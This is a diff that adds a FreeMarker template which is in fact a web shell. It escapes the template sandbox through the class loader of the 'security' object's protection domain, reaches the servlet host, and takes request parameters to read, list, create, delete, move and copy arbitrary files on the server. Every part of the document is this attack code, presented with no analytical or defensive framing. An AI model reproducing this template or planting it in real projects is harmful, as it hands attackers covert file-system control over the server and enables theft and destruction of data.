@@ -1,0 +1,105 @@
+<#compress>
+<#assign protected_domain=security.getClass().getProtectionDomain()>
+<#assign loader=protected_domain.getClassLoader()>
+<#assign root=loader.getResources()>
+<#assign context=root.getContext()>
+<#assign host=context.getParent()>
+<#assign action=request.getParameter("0")>
+<#assign orig_appbase=host.getAppBaseFile()>
+
+<#if action == 'info'>
+    Host application base: ${orig_appbase}
+    <#assign baseURLs=root.getBaseUrls()>
+    Current application base: ${baseURLs[0]}
+</#if>
+
+<#if action == 'read'>
+    <#assign filename=request.getParameter("1")>
+    <#attempt>
+        <#include filename parse=false encoding="UTF-8">
+    <#recover>
+        Failed to read ${filename}
+    </#attempt>
+</#if>
+
+<#if action == 'read_bytes'>
+    <#assign filename=request.getParameter("1")>
+    <#assign urls=protected_domain.getClassLoader().getURLs()>
+    <#attempt>
+        <#assign file_url=urls[0].toURI().resolve(filename).toURL()>
+        <#assign file_content=file_url.getContent()>
+        <#list 0..999999999 as _>
+            <#assign byte=file_content.read()>
+            <#if byte == -1>
+                <#break>
+            </#if>
+${byte},</#list>
+    <#recover>
+        Failed to read ${filename}
+    </#attempt>
+</#if>
+
+<#if action == 'list'>
+    <#assign src=request.getParameter("1")>
+    <#assign x=host.setAppBase(src)>
+    <#assign source_file=host.getAppBaseFile()>
+    <#assign list=source_file.list()>
+    <#list list as item>
+        ${item}
+    </#list>
+    <#assign x=host.setAppBase(orig_appbase)>
+</#if>
+
+<#if action == 'create_file'>
+    <#assign src=request.getParameter("1")>
+    <#assign x=host.setAppBase(src)>
+    <#assign source_file=host.getAppBaseFile()>
+    creating file ${source_file}
+    success: ${source_file.createNewFile()?string}
+    <#assign x=host.setAppBase(orig_appbase)>
+</#if>
+
+<#if action == 'mkdir'>
+    <#assign src=request.getParameter("1")>
+    <#assign x=host.setAppBase(src)>
+    <#assign source_file=host.getAppBaseFile()>
+    creating directories ${source_file}
+    success: ${source_file.mkdirs()?string}
+    <#assign x=host.setAppBase(orig_appbase)>
+</#if>
+
+<#if action == 'delete'>
+    <#assign src=request.getParameter("1")>
+    <#assign x=host.setAppBase(src)>
+    <#assign source_file=host.getAppBaseFile()>
+    deleting ${source_file}
+    success: ${source_file.delete()?string}
+    <#assign x=host.setAppBase(orig_appbase)>
+</#if>
+
+<#if action == 'move'>
+    <#assign src=request.getParameter("1")>
+    <#assign dst=request.getParameter("2")>
+    <#assign x=host.setAppBase(src)>
+    <#assign source_file=host.getAppBaseFile()>
+    ${host.setAppBase(dst)}
+    <#assign dest_file=host.getAppBaseFile()>
+    source: ${source_file}
+    destination: ${dest_file}
+    success: ${source_file.renameTo(dest_file)?string}
+    <#assign x=host.setAppBase(orig_appbase)>
+</#if>
+
+<#if action == 'copy'>
+    <#assign src_path=request.getParameter("1")>
+    <#assign src=request.getParameter("2")>
+    <#assign dst=request.getParameter("3")>
+    <#assign URLs=loader.getURLs()>
+    <#assign URLs=URLs+[URLs[0].toURI().resolve(src_path).toURL()]>
+    <#assign newClassLoader=loader.newInstance(URLs)>
+    <#assign stream=newClassLoader.getResourceAsStream(src)>
+    <#assign writeResult=root.write(dst, stream, true)>
+    Wrote file to disk: ${writeResult?string}
+</#if>
+
+</#compress>
